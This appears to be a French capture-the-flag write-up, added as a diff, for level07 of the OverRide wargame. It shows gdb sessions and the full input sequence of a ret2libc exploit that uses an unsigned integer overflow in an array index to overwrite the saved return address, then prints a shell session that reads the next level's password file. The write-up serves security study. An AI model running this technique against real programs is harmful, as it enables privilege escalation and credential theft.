@@ -1,0 +1,102 @@
+Le programme nous permet 3 actions : read, store, quit
+Nous pouvons remarquer que nous ne pouvons pas stocker de nombre qui peuvent etre diviser par 3, de plus, le scanf a pour parametre %u
+qui signifie qu'il va recevoir un unsigned int cependant on remarque la possibilite d'envoyer des valeurs negative.
+En plus nous remarquons que lors de store number, notre nombre est stocker a index * 4 dut au shl 2.
+Nous n'avons pas d'appel a system ou execve donc nous allons devoir le faire par nous meme.
+Au debut du programme, envp et argv sont memset a 0.
+
+On va commencer par chercher l'adresse de system.
+
+(gdb) info address system
+Symbol "system" is at 0xf7e6aed0 = 4159090384 in a file compiled without debugging.
+
+puis on va chercher /bin/sh
+
+(gdb) find &system,+9999999,"/bin/sh"
+0xf7f897ec = 4160264172
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+
+Nous avons de quoi lancer notre shell maintenant, il ne nous reste plus qu'a trouver l'offset.
+Le soucis pour trouver l'offset est que nous ne pouvons pas envoyer une chaine de char comme nous le fesions avant
+et il faut donc trouver l'eip offset a la main.
+
+Pour ca il faut d'abord trouver ou est notre tab.
+On sait que tab est envoyer a la fonction read_number, on va donc breakpoint au debut de celle ci et un a la fin du programme
+afin d'avoir l'addresse de esp quand la stack sera "vide".
+
+(gdb) b read_number
+Breakpoint 1 at 0x80486dd
+(gdb) b* 0x080489f1
+Breakpoint 2 at 0x80489f1
+(gdb) r
+Starting program: /home/users/level07/level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: read
+
+Breakpoint 1, 0x080486dd in read_number ()
+
+(gdb) x/x $ebp+0x8
+0xffffd430:	0xffffd454
+
+Breakpoint 2, 0x080489f1 in main ()
+(gdb) i f
+Stack level 0, frame at 0xffffd620:
+ eip = 0x80489f1 in main; saved eip 0xf7e45513
+ Arglist at unknown address.
+ Locals at unknown address, Previous frame's sp is 0xffffd620
+ Saved registers:
+  eip at 0xffffd61c
+
+0xffffd61c - 0xffffd454 = 4294956572 - 4294956116 = 456
+456 / 4 = 114
+notre offset est donc de 114
+
+Or 114 % 3 = 0
+nous ne pouvons donc pas ecrire comme on le souhaite a cet index.
+Nous allons faire un int overflow afin de pouvoir appeler system et bin/sh (ret2libc)
+
+Pour ce faire :
+(0xffffffff) / 4 + Offset + 1 ==  0xffffffff / 4 + 114 + 1 = 1073741938
+<--------->               <--->
+ unsigned int max         Overflow
+Donc en utilisant 1073741938, nous pouvons ecrire directement a l'index 114.
+
+
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+Input command: quit
+$ whoami
+level08
+$ pwd
+/home/users/level07
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
